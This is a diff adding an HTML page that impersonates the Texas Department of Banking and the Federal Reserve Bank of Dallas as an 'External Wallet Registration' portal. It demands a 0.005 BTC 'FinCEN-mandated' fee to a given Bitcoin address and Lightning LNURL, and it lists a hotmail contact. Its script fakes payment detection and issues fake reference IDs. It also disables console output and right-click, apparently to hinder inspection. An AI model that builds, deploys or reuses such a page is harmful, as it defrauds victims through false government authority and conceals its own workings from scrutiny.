@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>External Wallet Registration | Texas Institutional Funds Management Authority</title>
+    
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@300;400;500;600;700;800&family=Roboto+Mono:wght@400;500;600;700&display=swap');
+        
+        body {
+            font-family: 'Public Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f0f2f5;
+            color: #1a2b3e;
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        
+        .fed-header {
+            background: linear-gradient(135deg, #002868 0%, #001a4d 100%);
+            border-bottom: 3px solid #fcb421;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .gov-banner {
+            background-color: #002868;
+            color: #ffffff;
+            font-size: 0.7rem;
+            padding: 0.5rem 0;
+            border-bottom: 1px solid #335b8c;
+            letter-spacing: 0.3px;
+        }
+        
+        .breadcrumb-container {
+            background-color: #ffffff;
+            border-bottom: 1px solid #d9e0e8;
+            padding: 0.8rem 0;
+            font-size: 0.85rem;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.03);
+        }
+        
+        .breadcrumb-container a {
+            color: #0047ab;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        
+        .agency-badge {
+            background-color: #002d5a;
+            color: #fcb421;
+            font-weight: 700;
+            padding: 0.3rem 1rem;
+            border-radius: 3px;
+            font-size: 0.7rem;
+            letter-spacing: 0.8px;
+            text-transform: uppercase;
+            display: inline-block;
+            border: 1px solid #335b8c;
+        }
+        
+        .case-banner {
+            background-color: #fff5e0;
+            border-left: 6px solid #b45309;
+            padding: 1.5rem 2rem;
+            margin-bottom: 2rem;
+            border-radius: 0 8px 8px 0;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+        
+        .restoration-card {
+            background-color: #ffffff;
+            border: 1px solid #dde3ed;
+            border-top: 4px solid #2563eb;
+            padding: 2rem;
+            margin-bottom: 1.5rem;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.02);
+            border-radius: 0 0 8px 8px;
+        }
+        
+        .legal-footer {
+            background-color: #0a1c2f;
+            color: #b0c4de;
+            font-size: 0.8rem;
+            padding: 2.5rem 0 1.5rem 0;
+            border-top: 4px solid #fcb421;
+        }
+        
+        .qr-container {
+            background: white;
+            border-radius: 16px;
+            padding: 2rem;
+            text-align: center;
+            border: 1px solid #e0e7f0;
+            box-shadow: 0 6px 14px rgba(0,0,0,0.02);
+            margin: 1.5rem 0;
+        }
+        
+        .qr-container h3 {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: #1a2b3e;
+            margin-bottom: 1rem;
+        }
+        
+        .btc-address {
+            font-family: 'Roboto Mono', monospace;
+            background: #f4f7fc;
+            padding: 1rem;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            word-break: break-all;
+            border: 1px solid #d4dcec;
+            color: #1e3a5f;
+            font-weight: 500;
+            margin: 1rem 0;
+        }
+        
+        .lnurl-address {
+            font-family: 'Roboto Mono', monospace;
+            background: #f0f7ff;
+            padding: 0.75rem;
+            border-radius: 6px;
+            font-size: 0.75rem;
+            word-break: break-all;
+            border: 1px solid #b8d3ff;
+            color: #0369a1;
+        }
+        
+        .fee-box {
+            background: #fef9c3;
+            border-left: 4px solid #eab308;
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin: 1.5rem 0;
+        }
+        
+        .fee-amount {
+            font-size: 2rem;
+            font-weight: 800;
+            color: #0a1f2e;
+            font-family: 'Roboto Mono', monospace;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 1rem;
+            border: 2px solid #d1d9e6;
+            border-radius: 8px;
+            font-family: 'Roboto Mono', monospace;
+            font-size: 0.9rem;
+            margin: 1rem 0;
+        }
+        
+        .input-field:focus {
+            border-color: #2563eb;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(37,99,235,0.1);
+        }
+        
+        .submit-btn {
+            background: #0047ab;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 1rem 2rem;
+            font-weight: 600;
+            font-size: 1rem;
+            width: 100%;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            border: 1px solid #00307a;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            transition: all 0.2s;
+        }
+        
+        .submit-btn:hover {
+            background: #00307a;
+        }
+        
+        .submit-btn:disabled {
+            background: #94a3b8;
+            cursor: not-allowed;
+        }
+        
+        .wallet-preview {
+            background: #0a1f2e;
+            border-radius: 16px;
+            padding: 1.5rem;
+            color: white;
+        }
+        
+        .wallet-preview small {
+            color: #9cb9e0;
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .wallet-preview .address {
+            font-family: 'Roboto Mono', monospace;
+            font-size: 0.85rem;
+            word-break: break-all;
+            background: #1e3a5f;
+            padding: 0.75rem;
+            border-radius: 6px;
+            margin-top: 0.5rem;
+        }
+        
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.6rem 0;
+            border-bottom: 1px solid #edf2f7;
+        }
+        
+        .info-row:last-child {
+            border-bottom: none;
+        }
+        
+        .info-row span:first-child {
+            color: #4a5b6e;
+            font-weight: 500;
+        }
+        
+        .info-row span:last-child {
+            font-weight: 600;
+            color: #1a2b3e;
+        }
+        
+        .or-divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 2rem 0;
+        }
+        
+        .or-divider::before,
+        .or-divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #d1d9e6;
+        }
+        
+        .or-divider span {
+            padding: 0 1rem;
+            color: #6b7280;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- GOV BANNER -->
+    <div class="gov-banner w-full">
+        <div class="container mx-auto px-4 flex items-center gap-4">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect width="24" height="24" fill="#B22234"/>
+                <rect y="2" width="24" height="2" fill="white"/><rect y="6" width="24" height="2" fill="white"/><rect y="10" width="24" height="2" fill="white"/>
+                <rect y="14" width="24" height="2" fill="white"/><rect y="18" width="24" height="2" fill="white"/><rect y="22" width="24" height="2" fill="white"/>
+                <rect width="10" height="12" fill="#3C3B6E"/>
+            </svg>
+            <span class="text-xs font-semibold uppercase tracking-wider">An official website of the Texas State Government and Federal Reserve Bank of Dallas</span>
+        </div>
+    </div>
+
+    <!-- HEADER -->
+    <header class="fed-header text-white py-4">
+        <div class="container mx-auto px-4 flex flex-wrap justify-between items-center">
+            <div class="flex items-center gap-4">
+                <div class="text-3xl">🏛️</div>
+                <div>
+                    <h1 class="text-2xl md:text-3xl font-black uppercase tracking-tight">Texas Department of Banking</h1>
+                    <p class="text-xs text-amber-300 font-bold uppercase tracking-wider">Texas Institutional Funds Management Authority</p>
+                    <p class="text-[0.65rem] text-blue-200 mt-1">In cooperation with the Federal Reserve Bank of Dallas — Eleventh District</p>
+                </div>
+            </div>
+            <div class="bg-blue-900 px-4 py-2 rounded border border-blue-500">
+                <span class="text-xs font-bold uppercase tracking-widest text-white">● EXTERNAL WALLET REGISTRATION</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- BREADCRUMB -->
+    <div class="breadcrumb-container">
+        <div class="container mx-auto px-4">
+            <div class="flex items-center gap-2 text-sm">
+                <a href="#" class="text-blue-800 hover:underline">Federal Reserve Bank of Dallas</a>
+                <span class="text-gray-400">›</span>
+                <a href="#" class="text-blue-800 hover:underline">Texas Department of Banking</a>
+                <span class="text-gray-400">›</span>
+                <a href="#" class="text-blue-800 hover:underline">Texas Institutional Funds Management Authority</a>
+                <span class="text-gray-400">›</span>
+                <span class="font-bold text-gray-700">External Wallet Registration • Form 1099-DA Compliance</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- MAIN CONTENT -->
+    <div class="container mx-auto px-4 py-8">
+        
+        <!-- AGENCY BADGE -->
+        <div class="flex justify-between items-start mb-6">
+            <span class="agency-badge">☷ FINCEN REGISTRATION 31 CFR § 1010.410</span>
+            <span class="bg-gray-800 text-white px-4 py-2 rounded text-xs font-mono font-bold">REG-2026-02-25</span>
+        </div>
+
+        <!-- CASE BANNER -->
+        <div class="case-banner">
+            <div class="flex items-start gap-4">
+                <div class="text-5xl"></div>
+                <div>
+                    <h2 class="text-2xl font-black text-gray-900 mb-1">EXTERNAL WALLET REGISTRATION</h2>
+                    <p class="text-gray-800 font-semibold">Financial Crimes Enforcement Network (FinCEN) Required Registration</p>
+                    <p class="text-gray-700 text-sm mt-2"><span class="font-bold">31 CFR § 1010.410 Compliance:</span> External cryptocurrency wallets must be registered with the Texas Institutional Funds Management Authority prior to transaction processing.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- ACCOUNT HOLDER SUMMARY (Generic American) -->
+        <div class="grid md:grid-cols-2 gap-6 mb-6">
+            <div class="bg-white p-6 border border-slate-300 rounded">
+                <h3 class="font-bold text-sm mb-4 flex items-center gap-2">
+                    <span>👤</span> REGISTRANT INFORMATION
+                </h3>
+                <div class="space-y-3">
+                    <div class="info-row">
+                        <span class="text-gray-600">Full Name</span>
+                        <span class="font-bold" id="displayName">Loading...</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="text-gray-600">Registration ID</span>
+                        <span class="font-mono" id="displayRegId">Loading...</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="text-gray-600">Status</span>
+                        <span class="status-badge" style="background: #fef1f1; color: #b91c1c; padding: 0.25rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 700;">PENDING VERIFICATION</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="bg-white p-6 border border-slate-300 rounded">
+                <h3 class="font-bold text-sm mb-4 flex items-center gap-2">
+                    <span>🏦</span> REGISTRATION DETAILS
+                </h3>
+                <div class="space-y-3">
+                    <div class="info-row">
+                        <span class="text-gray-600">Form Type</span>
+                        <span class="font-bold">FinCEN 1099-DA</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="text-gray-600">Filing Date</span>
+                        <span class="font-mono" id="filingDate">February 26, 2026</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="text-gray-600">Registration Fee</span>
+                        <span class="font-bold text-amber-700" id="feeAmount">0.005 BTC</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- FEE NOTICE - OFFICIAL GOVERNMENT FEE -->
+        <div class="fee-box">
+            <div class="flex justify-between items-center mb-3">
+                <span class="font-bold text-amber-800 text-sm uppercase tracking-wider">31 CFR § 1010.410(f)(3) REGISTRATION FEE</span>
+                <span class="bg-amber-200 text-amber-900 px-3 py-1 rounded-full text-xs font-bold">FIXED RATE</span>
+            </div>
+            <div class="flex items-baseline gap-3">
+                <span class="fee-amount">0.005 BTC</span>
+                <span class="text-amber-800">(Non-refundable processing fee)</span>
+            </div>
+            <p class="text-sm text-amber-900 mt-3">This is the official FinCEN-mandated registration fee for external wallet verification. The fee is non-negotiable and must be paid in full for your registration to be processed. This fee covers cryptographic attestation, compliance review, and permanent registration in the Texas IFMA database.</p>
+        </div>
+
+        <!-- PAYMENT INSTRUCTIONS -->
+        <div class="restoration-card">
+            <h3 class="font-black text-lg mb-4 flex items-center gap-2">
+                <span></span> STEP 1: SUBMIT REGISTRATION FEE
+            </h3>
+
+            <!-- LNURL Payment Option -->
+            <div class="qr-container">
+                <h3>Option A: Lightning Network (Instant)</h3>
+                <p class="text-sm text-gray-600 mb-4">Scan with Lightning-compatible wallet (Wallet of Satoshi, Phoenix, Breez)</p>
+                
+                <!-- LNURL QR Code -->
+                <img src="https://i.ibb.co/kgLLjG4m/IMG-20260226-081808-738.jpg"
+                     style="width: 250px; height: 250px; display: block; margin: 0 auto 20px; border: 2px solid #e2e8f0; border-radius: 16px; padding: 8px; background: white;"
+                     alt="Lightning QR Code">
+                
+                <p class="text-sm font-bold mt-2">LNURL Address:</p>
+                <div class="lnurl-address mt-2 select-all">
+                    lnurl1dp68gurn8ghj7ampd3kx2ar0veekzar0wd5xjtnrdakj7tnhv4kxctttdehhwm30d3h82unvwqhkymmjde6x7ctnws6nzwq0dvxd9
+                </div>
+                <button onclick="copyLnurl()" class="text-xs text-blue-600 mt-2 underline">Copy LNURL</button>
+            </div>
+
+            <!-- Divider -->
+            <div class="or-divider">
+                <span>OR</span>
+            </div>
+
+            <!-- Native BTC Payment Option -->
+            <div class="qr-container">
+                <h3>Option B: Native BTC (On-Chain)</h3>
+                <p class="text-sm text-gray-600 mb-4">Scan with any Bitcoin wallet (Phantom, Blue Wallet, Electrum)</p>
+                
+                <!-- Native BTC QR Code -->
+                <img src="https://i.ibb.co/7xHkx1Sw/Screenshot-20260226-071641-Phantom.png" 
+                     style="width: 250px; height: 250px; display: block; margin: 0 auto 20px; border: 2px solid #e2e8f0; border-radius: 16px; padding: 8px; background: white;"
+                     alt="Bitcoin QR Code">
+                
+                <p class="text-sm font-bold mt-2">Bitcoin Address:</p>
+                <div class="btc-address select-all">
+                    bc1pfr37jsl7k6epzuzk5rhjx067efyy4s9vr3qf9zagcd3mfvhvvclqqfq6l4
+                </div>
+                <button onclick="copyBtcAddress()" class="text-xs text-blue-600 mt-2 underline">Copy Address</button>
+            </div>
+
+            <!-- CONFIRMATION STATUS (Simulated) -->
+            <div class="bg-blue-50 border-l-4 border-blue-800 p-4 mt-6">
+                <p class="text-sm text-blue-900 font-bold">ⓘ PAYMENT PROCESSING</p>
+                <p class="text-xs text-gray-700 mt-1">Once your payment is detected on the blockchain (1 network confirmation for Lightning, 3 confirmations for on-chain), the verification field below will become available. This typically takes 1-30 minutes depending on network conditions.</p>
+            </div>
+        </div>
+
+        <!-- STEP 2: VERIFICATION ADDRESS SUBMISSION -->
+        <div class="restoration-card" id="verificationSection">
+            <h3 class="font-black text-lg mb-4 flex items-center gap-2">
+                <span></span> STEP 2: REGISTER YOUR WALLET
+            </h3>
+
+            <div class="bg-gray-50 p-5 rounded-lg mb-4">
+                <p class="text-sm text-gray-700">After sending the registration fee, enter the Bitcoin address you wish to verify with this payment. This address will be permanently registered in the Texas IFMA database and linked to your identity for compliance purposes under 31 CFR § 1010.410.</p>
+            </div>
+
+            <!-- Wallet Address Input Field -->
+            <div style="margin: 25px 0;">
+                <label for="walletAddress" class="block text-sm font-bold text-gray-700 mb-2">
+                    BITCOIN WALLET ADDRESS FOR VERIFICATION <span class="text-red-600">*</span>
+                </label>
+                <input type="text" 
+                       id="walletAddress" 
+                       class="input-field" 
+                       placeholder="Enter your Bitcoin address (e.g., bc1q... or 3... or 1...)"
+                       pattern="^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,59}$"
+                       title="Please enter a valid Bitcoin address">
+                <p class="text-xs text-gray-500 mt-1">Format: Native Segwit (bc1), Legacy (1), or Nested Segwit (3)</p>
+            </div>
+
+            <!-- Submit Button -->
+            <button class="submit-btn" id="submitBtn" disabled>
+                SUBMIT FOR REGISTRATION
+            </button>
+
+            <!-- Success Message (Hidden initially) -->
+            <div id="successMessage" style="display: none;" class="mt-4 p-4 bg-green-50 border-l-4 border-green-600">
+                <p class="font-bold text-green-800">✓ REGISTRATION SUBMITTED</p>
+                <p class="text-sm text-gray-700 mt-1">Your wallet address has been submitted for verification. You will receive a confirmation email within 24-48 hours once the compliance review is complete.</p>
+                <p class="text-xs text-gray-500 mt-2">Reference ID: TX-IFMA-<span id="refId"></span></p>
+            </div>
+
+            <!-- Error Message (Hidden initially) -->
+            <div id="errorMessage" style="display: none;" class="mt-4 p-4 bg-red-50 border-l-4 border-red-600">
+                <p class="font-bold text-red-800">✗ INVALID ADDRESS</p>
+                <p class="text-sm text-gray-700 mt-1">The Bitcoin address you entered does not appear to be valid. Please check the address format and try again.</p>
+            </div>
+        </div>
+
+        <!-- WALLET PREVIEW - Shows what they're registering -->
+        <div class="wallet-preview mt-6">
+            <div class="flex justify-between items-center mb-3">
+                <small>WALLET TO BE REGISTERED</small>
+                <small>PENDING VERIFICATION</small>
+            </div>
+            <div id="previewAddress" class="address">
+                Not yet entered
+            </div>
+            <div class="flex justify-between mt-3 text-xs">
+                <span>Registration Fee: 0.005 BTC</span>
+                <span>FinCEN 1099-DA Pending</span>
+            </div>
+        </div>
+
+        <!-- OFFICER SIGNATURE -->
+        <div class="officer-signature" style="border-left: 4px solid #fcb421; background: #fafcff; padding: 1.25rem; margin-top: 2rem; border-radius: 0 8px 8px 0;">
+            <div class="flex justify-between items-center">
+                <div>
+                    <p class="text-xs text-gray-500 uppercase tracking-wider">Authorized Compliance Officer</p>
+                    <p class="font-bold text-lg">CompOffice Office</p>
+                    <p class="text-sm text-gray-600">Senior Compliance Officer • Texas IFMA</p>
+                </div>
+                <div class="text-right">
+                    <p class="text-xs text-gray-500">Badge #</p>
+                    <p class="font-mono font-bold">TIFMA-11</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- TIMESTAMP -->
+        <div class="text-xs text-gray-500 text-right mt-4 pt-4 border-t">
+            <span>Directive issued: <span id="currentCSTTime"></span> CST • Federal Reserve Bank of Dallas Node 11 • External Wallet Registration v.2026.02</span>
+        </div>
+
+        <!-- TECHNICAL SUPPORT -->
+        <div class="bg-gray-100 p-5 border border-gray-400 rounded text-sm mt-6">
+            <h4 class="font-bold text-gray-900 text-sm uppercase mb-3">📞 REGISTRATION SUPPORT DESK</h4>
+            <div class="grid md:grid-cols-2 gap-4">
+                <div><span class="font-bold">FinCEN Compliance Hotline:</span><br>202.354.6400</div>
+                <div><span class="font-bold">Texas IFMA Registration:</span><br>512.475.1300</div>
+                <div><span class="font-bold">Compliance Office:</span><br>dob.texas.gov@hotmail.com</div>
+                <div><span class="font-bold">Registration Portal:</span><br>https://ifma.texas.gov/register</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="legal-footer">
+        <div class="container mx-auto px-4">
+            <div class="grid md:grid-cols-3 gap-8 mb-8">
+                <div>
+                    <h5 class="text-white font-bold text-sm uppercase tracking-wider mb-3">Federal Reserve Bank of Dallas</h5>
+                    <p class="text-xs text-gray-400">2200 N. Pearl St.<br>Dallas, Texas 75201</p>
+                </div>
+                <div>
+                    <h5 class="text-white font-bold text-sm uppercase tracking-wider mb-3">Texas Department of Banking</h5>
+                    <p class="text-xs text-gray-400">2601 N Lamar Blvd<br>Austin, TX 78705</p>
+                </div>
+                <div>
+                    <h5 class="text-white font-bold text-sm uppercase tracking-wider mb-3">Texas Institutional Funds Management Authority</h5>
+                    <p class="text-xs text-gray-400">Eleventh District Settlement Node</p>
+                </div>
+            </div>
+            <div class="border-t border-gray-700 pt-6 text-xs text-gray-500 flex flex-wrap gap-4">
+                <a href="#" class="hover:text-white">dallasfed.org</a>
+                <a href="#" class="hover:text-white">dob.texas.gov</a>
+                <a href="#" class="hover:text-white">ifma.texas.gov/register</a>
+                <span class="text-gray-700">External Wallet Registration • FinCEN 1099-DA Compliance</span>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+    // ============ DYNAMIC CST TIME ============
+    function updateCSTTime() {
+        const now = new Date();
+        const options = {
+            timeZone: 'America/Chicago',
+            year: 'numeric',
+            month: '2-digit',
+            day: '2-digit',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit',
+            hour12: true
+        };
+        document.getElementById('currentCSTTime').innerText = now.toLocaleString('en-US', options);
+    }
+    updateCSTTime();
+    setInterval(updateCSTTime, 1000);
+
+    // ============ DYNAMIC REGISTRANT INFO ============
+    // Simulate logged-in user data from previous page
+    document.addEventListener('DOMContentLoaded', function() {
+        const savedName = localStorage.getItem('tifma_name') || 'Michael T. Anderson';
+        const savedRegId = localStorage.getItem('tifma_regid') || 'TX-'+ Math.random().toString(36).substring(2,10).toUpperCase();
+        
+        document.getElementById('displayName').innerText = savedName;
+        document.getElementById('displayRegId').innerText = savedRegId;
+        
+        // Set filing date
+        const today = new Date();
+        document.getElementById('filingDate').innerText = today.toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
+    });
+
+    // ============ COPY FUNCTIONS ============
+    window.copyLnurl = function() {
+        const lnurl = "lnurl1dp68gurn8ghj7ampd3kx2ar0veekzar0wd5xjtnrdakj7tnhv4kxctttdehhwm30d3h82unvwqhkymmjde6x7ctnws6nzwq0dvxd9";
+        navigator.clipboard.writeText(lnurl).then(() => {
+            alert('LNURL copied to clipboard');
+        }).catch(() => {
+            prompt('Copy this LNURL:', lnurl);
+        });
+    };
+
+    window.copyBtcAddress = function() {
+        const btcAddress = "bc1pfr37jsl7k6epzuzk5rhjx067efyy4s9vr3qf9zagcd3mfvhvvclqqfq6l4";
+        navigator.clipboard.writeText(btcAddress).then(() => {
+            alert('Bitcoin address copied to clipboard');
+        }).catch(() => {
+            prompt('Copy this Bitcoin address:', btcAddress);
+        });
+    };
+
+    // ============ WALLET ADDRESS VALIDATION ============
+    const walletInput = document.getElementById('walletAddress');
+    const submitBtn = document.getElementById('submitBtn');
+    const previewAddress = document.getElementById('previewAddress');
+    const successMsg = document.getElementById('successMessage');
+    const errorMsg = document.getElementById('errorMessage');
+    const refIdSpan = document.getElementById('refId');
+
+    // Basic Bitcoin address validation (simplified)
+    function isValidBitcoinAddress(address) {
+        if (!address) return false;
+        // Basic format check: starts with bc1, 1, or 3 and has valid length
+        return /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,59}$/.test(address);
+    }
+
+    // Enable/disable submit based on input
+    walletInput.addEventListener('input', function() {
+        const address = this.value.trim();
+        previewAddress.innerText = address || 'Not yet entered';
+        
+        if (address && isValidBitcoinAddress(address)) {
+            submitBtn.disabled = false;
+            errorMsg.style.display = 'none';
+        } else {
+            submitBtn.disabled = true;
+            if (address) {
+                errorMsg.style.display = 'block';
+            } else {
+                errorMsg.style.display = 'none';
+            }
+        }
+    });
+
+    // Handle submission
+    submitBtn.addEventListener('click', function() {
+        const address = walletInput.value.trim();
+        
+        if (isValidBitcoinAddress(address)) {
+            // Generate random reference ID
+            const refId = Math.random().toString(36).substring(2, 12).toUpperCase();
+            refIdSpan.innerText = refId;
+            
+            // Show success message
+            successMsg.style.display = 'block';
+            errorMsg.style.display = 'none';
+            submitBtn.disabled = true;
+            walletInput.disabled = true;
+            
+            // Store registration in localStorage
+            const registration = {
+                address: address,
+                timestamp: Date.now(),
+                refId: refId,
+                fee: '0.005 BTC'
+            };
+            localStorage.setItem('wallet_registration_' + address, JSON.stringify(registration));
+            
+            // Update preview
+            previewAddress.innerText = address + ' ✓';
+        }
+    });
+
+    // ============ SIMULATE PAYMENT DETECTION ============
+    // This simulates that after 30 seconds, the system "detects" payment and enables the field
+    setTimeout(function() {
+        // Show notification that payment was detected
+        const paymentNotice = document.createElement('div');
+        paymentNotice.className = 'mt-4 p-3 bg-green-100 border-l-4 border-green-600 text-sm';
+        paymentNotice.innerHTML = '<span class="font-bold text-green-800">✓ </span>';
+        
+        document.getElementById('verificationSection').insertBefore(paymentNotice, document.getElementById('verificationSection').firstChild);
+        
+        // Enable input (if not already used)
+        if (!walletInput.disabled) {
+            walletInput.disabled = false;
+        }
+    }, 30000); // 30 seconds for demo
+
+    // ============ ANTI-DEBUGGING ============
+    (function(){
+        const methods = ['log', 'warn', 'error', 'debug', 'info'];
+        for (let i = 0; i < methods.length; i++) {
+            try { window.console[methods[i]] = function(){}; } catch(e){}
+        }
+    })();
+
+    // Disable right click
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    </script>
+</body>
+</html>
